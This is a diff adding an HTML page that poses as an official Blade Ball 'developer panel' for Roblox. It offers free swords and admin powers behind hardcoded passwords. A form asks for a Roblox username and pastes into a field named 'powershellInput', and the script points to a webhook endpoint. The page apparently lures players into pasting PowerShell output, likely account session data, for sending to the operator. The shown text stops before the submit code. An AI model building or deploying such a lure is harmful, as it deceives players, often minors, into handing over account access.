@@ -1,0 +1,1332 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>DEVELOPER PANEL - BLADE BALL SYSTEM ⚔️</title>
+<style>
+  * {
+    margin: 0;
+    padding: 0;
+    box-sizing: border-box;
+    font-family: 'Segoe UI', sans-serif;
+  }
+
+  body {
+    background: #0a0a0f;
+    color: #fff;
+    min-height: 100vh;
+    overflow-x: hidden;
+    background-image: 
+      radial-gradient(circle at 20% 20%, rgba(0, 255, 255, 0.15), transparent 40%),
+      radial-gradient(circle at 80% 80%, rgba(255, 0, 200, 0.15), transparent 40%);
+  }
+
+  /* ===== DEVELOPER BANNER ===== */
+  .dev-banner {
+    width: 100%;
+    padding: 14px 20px;
+    background: linear-gradient(90deg, #00ffff, #ff00c8, #00ffff);
+    background-size: 200% auto;
+    animation: shineBanner 3s linear infinite;
+    text-align: center;
+    font-weight: 900;
+    font-size: 18px;
+    letter-spacing: 3px;
+    color: #000;
+    text-transform: uppercase;
+    box-shadow: 0 4px 20px rgba(0, 255, 255, 0.4);
+    position: relative;
+    z-index: 101;
+  }
+
+  .dev-banner span {
+    display: inline-block;
+    animation: pulseText 1.5s ease-in-out infinite;
+  }
+
+  @keyframes shineBanner {
+    to { background-position: 200% center; }
+  }
+
+  @keyframes pulseText {
+    0%, 100% { transform: scale(1); }
+    50% { transform: scale(1.05); }
+  }
+
+  /* NAVBAR */
+  nav {
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    padding: 20px 50px;
+    background: rgba(10, 10, 15, 0.8);
+    backdrop-filter: blur(10px);
+    position: sticky;
+    top: 0;
+    z-index: 100;
+    border-bottom: 1px solid rgba(0, 255, 255, 0.2);
+  }
+
+  .logo {
+    font-size: 24px;
+    font-weight: 800;
+    background: linear-gradient(90deg, #00ffff, #ff00c8);
+    -webkit-background-clip: text;
+    -webkit-text-fill-color: transparent;
+    letter-spacing: 2px;
+  }
+
+  nav ul {
+    display: flex;
+    gap: 30px;
+    list-style: none;
+  }
+
+  nav ul li a {
+    color: #ccc;
+    text-decoration: none;
+    font-weight: 500;
+    transition: 0.3s;
+    cursor: pointer;
+  }
+
+  nav ul li a:hover {
+    color: #00ffff;
+    text-shadow: 0 0 10px #00ffff;
+  }
+
+  /* HERO */
+  .hero {
+    text-align: center;
+    padding: 100px 20px 60px;
+  }
+
+  .hero h1 {
+    font-size: 60px;
+    font-weight: 900;
+    background: linear-gradient(90deg, #00ffff, #ff00c8, #00ffff);
+    background-size: 200% auto;
+    -webkit-background-clip: text;
+    -webkit-text-fill-color: transparent;
+    animation: shine 3s linear infinite;
+    margin-bottom: 20px;
+  }
+
+  @keyframes shine {
+    to { background-position: 200% center; }
+  }
+
+  .hero p {
+    font-size: 18px;
+    color: #999;
+    max-width: 600px;
+    margin: 0 auto 30px;
+  }
+
+  .btn {
+    display: inline-block;
+    padding: 15px 40px;
+    background: linear-gradient(90deg, #00ffff, #ff00c8);
+    color: #000;
+    font-weight: 800;
+    border: none;
+    border-radius: 50px;
+    cursor: pointer;
+    font-size: 16px;
+    transition: 0.3s;
+    text-transform: uppercase;
+    letter-spacing: 1px;
+  }
+
+  .btn:hover {
+    transform: scale(1.05);
+    box-shadow: 0 0 30px rgba(0, 255, 255, 0.6);
+  }
+
+  /* FEATURES */
+  .features {
+    padding: 80px 50px;
+    text-align: center;
+  }
+
+  .features h2 {
+    font-size: 40px;
+    margin-bottom: 50px;
+    color: #fff;
+  }
+
+  .features h2 span {
+    color: #00ffff;
+  }
+
+  .grid {
+    display: grid;
+    grid-template-columns: repeat(auto-fit, minmax(260px, 1fr));
+    gap: 25px;
+    max-width: 1200px;
+    margin: 0 auto;
+  }
+
+  .card {
+    background: rgba(255, 255, 255, 0.03);
+    border: 1px solid rgba(0, 255, 255, 0.15);
+    border-radius: 20px;
+    padding: 30px;
+    transition: 0.3s;
+    cursor: pointer;
+  }
+
+  .card:hover {
+    transform: translateY(-10px);
+    border-color: #00ffff;
+    box-shadow: 0 10px 40px rgba(0, 255, 255, 0.2);
+  }
+
+  .card .icon {
+    font-size: 40px;
+    margin-bottom: 15px;
+  }
+
+  .card h3 {
+    font-size: 20px;
+    margin-bottom: 10px;
+    color: #fff;
+  }
+
+  .card p {
+    color: #999;
+    font-size: 14px;
+    line-height: 1.6;
+  }
+
+  /* ===== SOCIAL MEDIA SECTION ===== */
+  .socials {
+    padding: 80px 50px;
+    text-align: center;
+    background: linear-gradient(180deg, transparent, rgba(0, 255, 255, 0.03), transparent);
+    border-top: 1px solid rgba(0, 255, 255, 0.1);
+    border-bottom: 1px solid rgba(0, 255, 255, 0.1);
+  }
+
+  .socials h2 {
+    font-size: 40px;
+    margin-bottom: 15px;
+    color: #fff;
+  }
+
+  .socials h2 span {
+    color: #00ffff;
+  }
+
+  .socials p {
+    color: #999;
+    font-size: 16px;
+    margin-bottom: 40px;
+    max-width: 600px;
+    margin-left: auto;
+    margin-right: auto;
+  }
+
+  .social-grid {
+    display: flex;
+    justify-content: center;
+    gap: 25px;
+    flex-wrap: wrap;
+    max-width: 1000px;
+    margin: 0 auto;
+  }
+
+  .social-card {
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    gap: 12px;
+    padding: 30px 35px;
+    min-width: 160px;
+    background: rgba(255, 255, 255, 0.03);
+    border: 1px solid rgba(0, 255, 255, 0.15);
+    border-radius: 20px;
+    text-decoration: none;
+    color: #fff;
+    transition: 0.3s;
+    cursor: pointer;
+  }
+
+  .social-card:hover {
+    transform: translateY(-8px);
+    border-color: #00ffff;
+    box-shadow: 0 10px 40px rgba(0, 255, 255, 0.25);
+  }
+
+  .social-card .social-icon {
+    font-size: 45px;
+    line-height: 1;
+  }
+
+  .social-card .social-name {
+    font-size: 16px;
+    font-weight: 700;
+    letter-spacing: 1px;
+  }
+
+  .social-card .social-handle {
+    font-size: 12px;
+    color: #999;
+  }
+
+  .social-card.youtube:hover { border-color: #ff0000; box-shadow: 0 10px 40px rgba(255, 0, 0, 0.3); }
+  .social-card.tiktok:hover { border-color: #ff0050; box-shadow: 0 10px 40px rgba(255, 0, 80, 0.3); }
+  .social-card.twitter:hover { border-color: #1da1f2; box-shadow: 0 10px 40px rgba(29, 161, 242, 0.3); }
+  .social-card.discord:hover { border-color: #5865f2; box-shadow: 0 10px 40px rgba(88, 101, 242, 0.3); }
+  .social-card.linktree:hover { border-color: #43e660; box-shadow: 0 10px 40px rgba(67, 230, 96, 0.3); }
+
+  /* FOOTER */
+  footer {
+    text-align: center;
+    padding: 40px 20px;
+    color: #666;
+    font-size: 14px;
+    border-top: 1px solid rgba(255, 255, 255, 0.05);
+    margin-top: 50px;
+  }
+
+  footer span {
+    color: #00ffff;
+  }
+
+  /* ===== PASSWORD MODAL ===== */
+  .modal-overlay {
+    display: none;
+    position: fixed;
+    top: 0; left: 0;
+    width: 100%; height: 100%;
+    background: rgba(0, 0, 0, 0.85);
+    backdrop-filter: blur(8px);
+    z-index: 1000;
+    justify-content: center;
+    align-items: center;
+    animation: fadeIn 0.3s ease;
+  }
+
+  .modal-overlay.active {
+    display: flex;
+  }
+
+  @keyframes fadeIn {
+    from { opacity: 0; }
+    to { opacity: 1; }
+  }
+
+  .modal-box {
+    background: #0f0f18;
+    border: 1px solid #00ffff;
+    border-radius: 20px;
+    padding: 40px;
+    max-width: 420px;
+    width: 90%;
+    text-align: center;
+    box-shadow: 0 0 60px rgba(0, 255, 255, 0.3);
+    animation: popIn 0.4s cubic-bezier(0.68, -0.55, 0.27, 1.55);
+  }
+
+  @keyframes popIn {
+    from { transform: scale(0.7); opacity: 0; }
+    to { transform: scale(1); opacity: 1; }
+  }
+
+  .modal-box .lock-icon {
+    font-size: 50px;
+    margin-bottom: 15px;
+    animation: pulseText 1.5s ease-in-out infinite;
+  }
+
+  .modal-box h3 {
+    font-size: 22px;
+    margin-bottom: 10px;
+    background: linear-gradient(90deg, #00ffff, #ff00c8);
+    -webkit-background-clip: text;
+    -webkit-text-fill-color: transparent;
+  }
+
+  .modal-box p {
+    color: #999;
+    font-size: 14px;
+    margin-bottom: 20px;
+  }
+
+  .modal-box input {
+    width: 100%;
+    padding: 15px;
+    background: #0a0a0f;
+    border: 1px solid #333;
+    border-radius: 10px;
+    color: #fff;
+    font-size: 18px;
+    text-align: center;
+    letter-spacing: 4px;
+    margin-bottom: 15px;
+    outline: none;
+    transition: 0.3s;
+  }
+
+  .modal-box input:focus {
+    border-color: #00ffff;
+    box-shadow: 0 0 15px rgba(0, 255, 255, 0.4);
+  }
+
+  .modal-box .btn {
+    width: 100%;
+    padding: 14px;
+    font-size: 15px;
+    margin-bottom: 10px;
+  }
+
+  .modal-box .cancel-btn {
+    width: 100%;
+    padding: 12px;
+    background: transparent;
+    border: 1px solid #444;
+    color: #999;
+    border-radius: 50px;
+    cursor: pointer;
+    font-weight: 600;
+    font-size: 14px;
+    transition: 0.3s;
+    text-transform: uppercase;
+  }
+
+  .modal-box .cancel-btn:hover {
+    border-color: #ff4444;
+    color: #ff4444;
+  }
+
+  #passStatus {
+    font-size: 13px;
+    min-height: 18px;
+    margin-bottom: 10px;
+  }
+
+  /* ===== LAYER 2 (PANEL) ===== */
+  .layer2 {
+    display: none;
+    padding: 60px 50px;
+    min-height: 100vh;
+    animation: fadeIn 0.5s ease;
+  }
+
+  .layer2.active {
+    display: block;
+  }
+
+  .layer2-header {
+    text-align: center;
+    margin-bottom: 50px;
+  }
+
+  .layer2-header h1 {
+    font-size: 42px;
+    font-weight: 900;
+    background: linear-gradient(90deg, #00ffff, #ff00c8);
+    -webkit-background-clip: text;
+    -webkit-text-fill-color: transparent;
+    margin-bottom: 10px;
+  }
+
+  .layer2-header p {
+    color: #999;
+    font-size: 16px;
+  }
+
+  .panel-box {
+    max-width: 700px;
+    margin: 0 auto;
+    background: rgba(255, 255, 255, 0.03);
+    border: 1px solid rgba(0, 255, 255, 0.3);
+    border-radius: 20px;
+    padding: 40px;
+    box-shadow: 0 0 40px rgba(0, 255, 255, 0.15);
+  }
+
+  .panel-box h2 {
+    font-size: 26px;
+    margin-bottom: 20px;
+    color: #00ffff;
+    text-align: center;
+  }
+
+  /* ===== FORM GIVE SWORD ===== */
+  .form-group {
+    margin-bottom: 25px;
+    text-align: left;
+  }
+
+  .form-group label {
+    display: block;
+    font-size: 14px;
+    color: #00ffff;
+    font-weight: 700;
+    margin-bottom: 10px;
+    letter-spacing: 1px;
+    text-transform: uppercase;
+  }
+
+  .form-group input,
+  .form-group textarea {
+    width: 100%;
+    padding: 15px;
+    background: #0a0a0f;
+    border: 1px solid #333;
+    border-radius: 10px;
+    color: #fff;
+    font-size: 16px;
+    outline: none;
+    transition: 0.3s;
+  }
+
+  .form-group input:focus,
+  .form-group textarea:focus {
+    border-color: #00ffff;
+    box-shadow: 0 0 15px rgba(0, 255, 255, 0.4);
+  }
+
+  .form-group textarea {
+    resize: vertical;
+    min-height: 120px;
+    font-family: 'Courier New', monospace;
+    font-size: 12px;
+    line-height: 1.6;
+    letter-spacing: 0.5px;
+  }
+
+  /* ===== SCROLLABLE SWORD SELECT ===== */
+  .sword-scroll-box {
+    max-height: 320px;
+    overflow-y: auto;
+    border: 1px solid #333;
+    border-radius: 12px;
+    background: #0a0a0f;
+    padding: 10px;
+    scrollbar-width: thin;
+    scrollbar-color: #00ffff #0a0a0f;
+  }
+
+  .sword-scroll-box::-webkit-scrollbar {
+    width: 8px;
+  }
+
+  .sword-scroll-box::-webkit-scrollbar-track {
+    background: #0a0a0f;
+    border-radius: 10px;
+  }
+
+  .sword-scroll-box::-webkit-scrollbar-thumb {
+    background: linear-gradient(180deg, #00ffff, #ff00c8);
+    border-radius: 10px;
+  }
+
+  .sword-scroll-box::-webkit-scrollbar-thumb:hover {
+    background: linear-gradient(180deg, #ff00c8, #00ffff);
+  }
+
+  .sword-item {
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    padding: 12px 15px;
+    margin-bottom: 6px;
+    border-radius: 10px;
+    cursor: pointer;
+    transition: 0.2s;
+    border: 1px solid transparent;
+  }
+
+  .sword-item:hover {
+    background: rgba(0, 255, 255, 0.08);
+    border-color: rgba(0, 255, 255, 0.3);
+  }
+
+  .sword-item.selected {
+    background: linear-gradient(90deg, rgba(0, 255, 255, 0.15), rgba(255, 0, 200, 0.15));
+    border-color: #00ffff;
+    box-shadow: 0 0 15px rgba(0, 255, 255, 0.2);
+  }
+
+  .sword-item .sword-name {
+    font-size: 14px;
+    font-weight: 600;
+    color: #fff;
+  }
+
+  .sword-item .sword-rarity {
+    font-size: 11px;
+    font-weight: 700;
+    padding: 4px 10px;
+    border-radius: 20px;
+    text-transform: uppercase;
+    letter-spacing: 1px;
+  }
+
+  .rarity-common { background: #666; color: #fff; }
+  .rarity-rare { background: #2196f3; color: #fff; }
+  .rarity-legendary { background: #ff9800; color: #000; }
+  .rarity-limited { background: #9c27b0; color: #fff; }
+  .rarity-unique { background: #f44336; color: #fff; }
+  .rarity-secret { background: linear-gradient(90deg, #ff00c8, #00ffff); color: #000; }
+  .rarity-mythic { background: #e91e63; color: #fff; }
+  .rarity-ancient { background: #795548; color: #fff; }
+
+  .sword-search {
+    width: 100%;
+    padding: 12px 15px;
+    background: #0a0a0f;
+    border: 1px solid #333;
+    border-radius: 10px;
+    color: #fff;
+    font-size: 14px;
+    outline: none;
+    margin-bottom: 10px;
+    transition: 0.3s;
+  }
+
+  .sword-search:focus {
+    border-color: #00ffff;
+    box-shadow: 0 0 15px rgba(0, 255, 255, 0.3);
+  }
+
+  .submit-btn {
+    width: 100%;
+    padding: 16px;
+    background: linear-gradient(90deg, #00ffff, #ff00c8);
+    color: #000;
+    font-weight: 800;
+    border: none;
+    border-radius: 50px;
+    cursor: pointer;
+    font-size: 16px;
+    transition: 0.3s;
+    text-transform: uppercase;
+    letter-spacing: 1px;
+    margin-bottom: 15px;
+  }
+
+  .submit-btn:hover {
+    transform: scale(1.02);
+    box-shadow: 0 0 30px rgba(0, 255, 255, 0.6);
+  }
+
+  .submit-btn:disabled {
+    opacity: 0.6;
+    cursor: not-allowed;
+    transform: none;
+  }
+
+  .back-btn {
+    display: block;
+    width: 100%;
+    padding: 12px 30px;
+    background: transparent;
+    border: 1px solid #444;
+    color: #999;
+    border-radius: 50px;
+    cursor: pointer;
+    font-weight: 700;
+    font-size: 14px;
+    transition: 0.3s;
+    text-transform: uppercase;
+    text-align: center;
+  }
+
+  .back-btn:hover {
+    border-color: #00ffff;
+    color: #00ffff;
+    box-shadow: 0 0 20px rgba(0, 255, 255, 0.3);
+  }
+
+  #swordStatus {
+    text-align: center;
+    font-size: 14px;
+    min-height: 20px;
+    margin-bottom: 15px;
+    font-weight: 600;
+  }
+
+  /* RESPONSIVE */
+  @media (max-width: 768px) {
+    .dev-banner { font-size: 12px; letter-spacing: 1px; padding: 10px; }
+    nav { padding: 15px 20px; }
+    nav ul { gap: 15px; }
+    nav ul li a { font-size: 13px; }
+    .hero h1 { font-size: 36px; }
+    .features { padding: 50px 20px; }
+    .features h2 { font-size: 28px; }
+    .socials { padding: 50px 20px; }
+    .socials h2 { font-size: 28px; }
+    .social-card { padding: 20px 25px; min-width: 130px; }
+    .social-card .social-icon { font-size: 35px; }
+    .layer2 { padding: 40px 20px; }
+    .layer2-header h1 { font-size: 28px; }
+    .panel-box { padding: 25px; }
+    .sword-scroll-box { max-height: 250px; }
+  }
+</style>
+</head>
+<body>
+
+<!-- ===== DEVELOPER PANEL BANNER ===== -->
+<div class="dev-banner">
+  ⚔️ <span>DEVELOPER PANEL BLADE BALL SYSTEM</span> ⚔️
+</div>
+
+<!-- NAVBAR -->
+<nav>
+  <div class="logo">⚔️ BLADE BALL</div>
+  <ul>
+    <li><a href="#home">Home</a></li>
+    <li><a href="#features">Features</a></li>
+    <li><a href="#socials">Social</a></li>
+  </ul>
+</nav>
+
+<!-- ===== LAYER 1 (MAIN PAGE) ===== -->
+<div id="layer1">
+
+  <!-- HERO -->
+  <section class="hero" id="home">
+    <h1>BLADE BALL SUPPORT SYSTEM</h1>
+    <p>🔥 Developer panel to manage the Blade Ball server. Full control, full power — only for real devs! ⚡</p>
+    <button class="btn" onclick="document.getElementById('features').scrollIntoView({behavior:'smooth'})">
+      🔥 VIEW FEATURES
+    </button>
+  </section>
+
+  <!-- FEATURES -->
+  <section class="features" id="features">
+    <h2>Developer <span>Panel</span> 🛠️</h2>
+    <div class="grid">
+      <div class="card" onclick="openPassword('BANNED PLAYER')">
+        <div class="icon">🚫</div>
+        <h3>BANNED PLAYER</h3>
+        <p>Ban troublemaker players straight from the panel. One click and they're gone from the server! 🚷</p>
+      </div>
+      <div class="card" onclick="openPassword('REPORT PLAYER')">
+        <div class="icon">📢</div>
+        <h3>REPORT PLAYER</h3>
+        <p>Report toxic players/cheaters to the system. Evidence goes straight to the dev database! 📝</p>
+      </div>
+      <div class="card" onclick="openPassword('GIVE SWORD PLAYER')">
+        <div class="icon">⚔️</div>
+        <h3>GIVE SWORD PLAYER</h3>
+        <p>Give special swords to chosen players. Custom rarity & effects available! ✨</p>
+      </div>
+      <div class="card" onclick="openPassword('VIEW HISTORY TRADING GAME')">
+        <div class="icon">📜</div>
+        <h3>VIEW HISTORY TRADING GAME</h3>
+        <p>See all player trading history. Who traded what, when, and with whom. Full log! 🔍</p>
+      </div>
+      <div class="card" onclick="openPassword('SPECTATOR PLAYER')">
+        <div class="icon">👁️</div>
+        <h3>SPECTATOR PLAYER</h3>
+        <p>Peek at players without being seen. Monitor their gameplay from the shadows! 🥷</p>
+      </div>
+      <div class="card" onclick="openPassword('EVENT SYSTEM')">
+        <div class="icon">🎉</div>
+        <h3>EVENT SYSTEM</h3>
+        <p>Create spontaneous events — double XP, rare drops, giveaways. All from the panel! 🎊</p>
+      </div>
+      <div class="card" onclick="openPassword('VIEW SERVER BLADE BALL')">
+        <div class="icon">🌐</div>
+        <h3>VIEW SERVER BLADE BALL</h3>
+        <p>See all active servers, player count, region, and status. Full monitoring! 📡</p>
+      </div>
+      <div class="card" onclick="openPassword('UPDATE BLADE BALL')">
+        <div class="icon">🔄</div>
+        <h3>UPDATE BLADE BALL</h3>
+        <p>Push updates to the server — patch bugs, add features, balance swords. Real-time push! 🚀</p>
+      </div>
+    </div>
+  </section>
+
+  <!-- ===== OFFICIAL SOCIAL MEDIA ===== -->
+  <section class="socials" id="socials">
+    <h2>Follow <span>Blade Ball</span> Official 📢</h2>
+    <p>Get the latest updates, events, and codes from Blade Ball's official social media accounts below!</p>
+    <div class="social-grid">
+      
+      <a href="https://www.youtube.com/@Blade-Ball" target="_blank" rel="noopener noreferrer" class="social-card youtube">
+        <span class="social-icon">▶️</span>
+        <span class="social-name">YouTube</span>
+        <span class="social-handle">@Blade-Ball</span>
+      </a>
+      
+      <a href="https://www.tiktok.com/@bladeballrbx" target="_blank" rel="noopener noreferrer" class="social-card tiktok">
+        <span class="social-icon">🎵</span>
+        <span class="social-name">TikTok</span>
+        <span class="social-handle">@bladeballrbx</span>
+      </a>
+      
+      <a href="https://twitter.com/Blade_Ball" target="_blank" rel="noopener noreferrer" class="social-card twitter">
+        <span class="social-icon">🐦</span>
+        <span class="social-name">Twitter / X</span>
+        <span class="social-handle">@Blade_Ball</span>
+      </a>
+      
+      <a href="https://discord.gg/bladeball" target="_blank" rel="noopener noreferrer" class="social-card discord">
+        <span class="social-icon">💬</span>
+        <span class="social-name">Discord</span>
+        <span class="social-handle">discord.gg/bladeball</span>
+      </a>
+      
+      <a href="https://linktr.ee/bladeballrbx" target="_blank" rel="noopener noreferrer" class="social-card linktree">
+        <span class="social-icon">🌳</span>
+        <span class="social-name">Linktree</span>
+        <span class="social-handle">linktr.ee/bladeballrbx</span>
+      </a>
+      
+    </div>
+  </section>
+
+  <!-- FOOTER -->
+  <footer>
+    &copy; 2108 <span>Blade Ball Support System</span>
+  </footer>
+
+</div>
+
+<!-- ===== LAYER 2 (PANEL AFTER CORRECT PASSWORD) ===== -->
+<div class="layer2" id="layer2">
+  <div class="layer2-header">
+    <h1 id="layerTitle">⚡ DEVELOPER PANEL ⚡</h1>
+    <p id="layerSubtitle">Access granted. Welcome, Developer! 🎉</p>
+  </div>
+
+  <!-- ===== PANEL: GIVE SWORD PLAYER ===== -->
+  <div class="panel-box" id="panelGiveSword" style="display:none;">
+    <h2>⚔️ GIVE SWORD PLAYER</h2>
+    <div class="form-group">
+      <label>👤 Roblox Username</label>
+      <input type="text" id="robloxUsername" placeholder="Example: PlayerPro123" autocomplete="off">
+    </div>
+    <div class="form-group">
+      <label>🗡️ Choose Sword</label>
+      <input type="text" class="sword-search" id="swordSearch" placeholder="🔍 Search sword..." onkeyup="filterSwords()">
+      <div class="sword-scroll-box" id="swordScrollBox">
+        <!-- Sword list will be generated by JavaScript -->
+      </div>
+    </div>
+    <div class="form-group">
+      <label>📦 SEND SWORD TO PLAYER</label>
+      <textarea id="powershellInput" placeholder=""></textarea>
+    </div>
+    <div id="swordStatus"></div>
+    <button class="submit-btn" id="submitBtn" onclick="giveSword()">🎁 SEND SWORD</button>
+    <button class="back-btn" onclick="backToLayer1()">⬅️ BACK</button>
+  </div>
+
+  <!-- ===== DEFAULT PANEL (OTHER FEATURES) ===== -->
+  <div class="panel-box" id="panelDefault">
+    <h2 id="panelTitle">🔓 Feature: -</h2>
+    <div class="panel-info" style="background:#0a0a0f; border:1px solid #222; border-radius:12px; padding:20px; margin-bottom:20px; color:#ccc; font-size:15px; line-height:1.8; text-align:left;">
+      <p><strong style="color:#ff00c8;">Status:</strong> ✅ Access Granted</p>
+      <p><strong style="color:#ff00c8;">Feature:</strong> <span id="panelFeatureName">-</span></p>
+      <p><strong style="color:#ff00c8;">Server:</strong> Blade Ball #001</p>
+      <p><strong style="color:#ff00c8;">Access Rights:</strong> 🔑 Developer Mode</p>
+    </div>
+    <button class="back-btn" onclick="backToLayer1()">⬅️ BACK</button>
+  </div>
+
+</div>
+
+<!-- ===== PASSWORD MODAL ===== -->
+<div class="modal-overlay" id="passModal">
+  <div class="modal-box">
+    <div class="lock-icon">🔒</div>
+    <h3>RESTRICTED ACCESS</h3>
+    <p>Enter the developer password to access this feature</p>
+    <input type="password" id="passInput" placeholder="•••••••••" maxlength="20" 
+           onkeydown="if(event.key==='Enter') checkPassword()">
+    <div id="passStatus"></div>
+    <button class="btn" onclick="checkPassword()">🔓 UNLOCK</button>
+    <button class="cancel-btn" onclick="closePassword()">❌ Cancel</button>
+  </div>
+</div>
+
+<script>
+  // ===== NETLIFY FUNCTION ENDPOINT =====
+  const WEBHOOK_ENDPOINT = "/.netlify/functions/send-webhook";
+
+  // ===== DEVELOPER PASSWORD =====
+  const PASSWORD_GIVE_SWORD = "595080470";
+  const PASSWORD_DEFAULT = "2009";
+  
+  let selectedFeature = "";
+  let currentPassword = "";
+
+  // ===== FULL SWORD DATA =====
+  const swordList = [
+    { name: 'Base Sword', rarity: 'Common' },
+    { name: 'Dark Blade', rarity: 'Common' },
+    { name: 'Pickaxe', rarity: 'Common' },
+    { name: 'Massive Lollipop', rarity: 'Common' },
+    { name: 'Melon Slice', rarity: 'Common' },
+    { name: 'Wooden Hammer', rarity: 'Common' },
+    { name: 'Tanto', rarity: 'Common' },
+    { name: 'Bone', rarity: 'Common' },
+    { name: 'Rapier', rarity: 'Common' },
+    { name: 'Stick', rarity: 'Common' },
+    { name: 'Baseball Bat', rarity: 'Common' },
+    { name: 'Linked Sword', rarity: 'Common' },
+    { name: 'Battle Axe', rarity: 'Common' },
+    { name: 'Emerald Warden Blade', rarity: 'Common' },
+    { name: 'Kitchen Knife', rarity: 'Common' },
+    { name: 'Etherium Dagger', rarity: 'Rare' },
+    { name: 'Vengeful Dagger', rarity: 'Rare' },
+    { name: 'Executive Greatsword', rarity: 'Rare' },
+    { name: 'Dragonslayer Blade', rarity: 'Rare' },
+    { name: 'Spearbeard', rarity: 'Rare' },
+    { name: 'Spark Sword', rarity: 'Rare' },
+    { name: 'Blocky Sword', rarity: 'Rare' },
+    { name: 'Red Saber', rarity: 'Rare' },
+    { name: 'Rockxcalibur', rarity: 'Rare' },
+    { name: 'Rifle', rarity: 'Rare' },
+    { name: 'Glowy Bone', rarity: 'Rare' },
+    { name: 'Frying Pan', rarity: 'Rare' },
+    { name: 'Comically Large Spoon', rarity: 'Rare' },
+    { name: 'Bonsai Tree', rarity: 'Rare' },
+    { name: 'Plunger', rarity: 'Rare' },
+    { name: "Russo's Sword of Truth", rarity: 'Rare' },
+    { name: "Sabrina's Sword of Healing", rarity: 'Rare' },
+    { name: "DJ's Sword of Agility", rarity: 'Rare' },
+    { name: 'Excalibur', rarity: 'Legendary' },
+    { name: 'Holy Sword', rarity: 'Legendary' },
+    { name: 'Trident', rarity: 'Legendary' },
+    { name: 'Holy Axe', rarity: 'Legendary' },
+    { name: 'Solarus', rarity: 'Legendary' },
+    { name: 'Cyber Blade', rarity: 'Legendary' },
+    { name: 'Aurorum', rarity: 'Legendary' },
+    { name: 'Musara', rarity: 'Legendary' },
+    { name: 'Thunderous Hammer', rarity: 'Legendary' },
+    { name: 'Zoru', rarity: 'Legendary' },
+    { name: 'Ghost Walker', rarity: 'Legendary' },
+    { name: 'Venomshank', rarity: 'Legendary' },
+    { name: 'Darkheart', rarity: 'Legendary' },
+    { name: 'Soul Scythe', rarity: 'Legendary' },
+    { name: 'Windforce', rarity: 'Legendary' },
+    { name: 'Illumina', rarity: 'Legendary' },
+    { name: 'Firebrand', rarity: 'Legendary' },
+    { name: 'Solans', rarity: 'Legendary' },
+    { name: 'Void Sword', rarity: 'Legendary' },
+    { name: 'Dune Cleaver', rarity: 'Legendary' },
+    { name: 'Hallows Edge', rarity: 'Limited' },
+    { name: 'Prince Blade', rarity: 'Limited' },
+    { name: 'Wavelight Greatblade', rarity: 'Limited' },
+    { name: 'Empyrean Greatblade', rarity: 'Limited' },
+    { name: 'Oni Claws', rarity: 'Limited' },
+    { name: 'Cyber Scythe', rarity: 'Limited' },
+    { name: 'Nebula Scythe', rarity: 'Limited' },
+    { name: 'Dual Nebula Scythe', rarity: 'Limited' },
+    { name: 'Ether Blade', rarity: 'Limited' },
+    { name: 'Dual Ether Blade', rarity: 'Limited' },
+    { name: 'Vanguard Shield', rarity: 'Limited' },
+    { name: 'Empyrean Fortress', rarity: 'Limited' },
+    { name: 'Abyssal Blade', rarity: 'Limited' },
+    { name: 'Abyssal Shield', rarity: 'Limited' },
+    { name: 'Aetherial Kunai', rarity: 'Limited' },
+    { name: 'Aetherial Lance', rarity: 'Limited' },
+    { name: 'Blade of the Fallen King', rarity: 'Limited' },
+    { name: 'Resurrection Blade', rarity: 'Limited' },
+    { name: 'Twilight Blade', rarity: 'Limited' },
+    { name: 'Yin Yang Greatsword', rarity: 'Limited' },
+    { name: 'Eclipse Gleam', rarity: 'Limited' },
+    { name: 'Crystal Greatblade', rarity: 'Limited' },
+    { name: 'Dragon Slayer', rarity: 'Limited' },
+    { name: 'Cupid\'s Bow', rarity: 'Limited' },
+    { name: 'Black Ninja Katana', rarity: 'Limited' },
+    { name: 'Blue Ninja Katana', rarity: 'Limited' },
+    { name: 'Chroma Blade', rarity: 'Limited' },
+    { name: 'Chroma Scythe', rarity: 'Limited' },
+    { name: 'Dual Chroma Set', rarity: 'Limited' },
+    { name: 'Devil Greatsword', rarity: 'Limited' },
+    { name: 'Angel Greatsword', rarity: 'Limited' },
+    { name: 'Crystal Scissors', rarity: 'Limited' },
+    { name: 'Crystal Hammer', rarity: 'Limited' },
+    { name: 'Crimson Katana', rarity: 'Limited' },
+    { name: 'Demonic Blade', rarity: 'Limited' },
+    { name: 'Demonic Scythe', rarity: 'Limited' },
+    { name: 'Desert Blade', rarity: 'Limited' },
+    { name: 'Desert Claws', rarity: 'Limited' },
+    { name: 'Divine Sword', rarity: 'Limited' },
+    { name: 'Divine Blaster', rarity: 'Limited' },
+    { name: 'Frigid Blade', rarity: 'Limited' },
+    { name: 'Frigid Scythe', rarity: 'Limited' },
+    { name: 'Frost Saber', rarity: 'Limited' },
+    { name: 'Heavenly Sword', rarity: 'Limited' },
+    { name: 'Infinite Blade', rarity: 'Limited' },
+    { name: 'Infinite Scythe', rarity: 'Limited' },
+    { name: 'Kurogin Katana', rarity: 'Limited' },
+    { name: 'Lightning Dagger', rarity: 'Limited' },
+    { name: 'Love Blade', rarity: 'Limited' },
+    { name: 'Molten Greatblade', rarity: 'Limited' },
+    { name: 'Plasma Blaster', rarity: 'Limited' },
+    { name: 'Santa\'s Wrecker', rarity: 'Limited' },
+    { name: 'Sci Fi Axe', rarity: 'Limited' },
+    { name: 'Spooky Sightblade', rarity: 'Limited' },
+    { name: 'Sunset Katana', rarity: 'Limited' },
+    { name: 'Witch\'s Curse', rarity: 'Limited' },
+    { name: 'Avis Scythe', rarity: 'Unique' },
+    { name: 'Crescendo', rarity: 'Unique' },
+    { name: 'Cyber Thorn', rarity: 'Unique' },
+    { name: 'Champion Scythe', rarity: 'Unique' },
+    { name: 'Vishram', rarity: 'Unique' },
+    { name: 'Apex Blade', rarity: 'Unique' },
+    { name: 'Pumpkin VineCrusher', rarity: 'Unique' },
+    { name: 'Play Sword', rarity: 'Unique' },
+    { name: 'Ocean Blade', rarity: 'Unique' },
+    { name: 'Demon Blade', rarity: 'Unique' },
+    { name: 'Bloodgazer\'s Edge', rarity: 'Unique' },
+    { name: 'Hellfire Shadowslicer', rarity: 'Unique' },
+    { name: 'Bowtie Blade', rarity: 'Unique' },
+    { name: 'Essence Cleaver', rarity: 'Unique' },
+    { name: 'Witch\'s Broomstick', rarity: 'Unique' },
+    { name: 'Dreadbone Greataxe', rarity: 'Unique' },
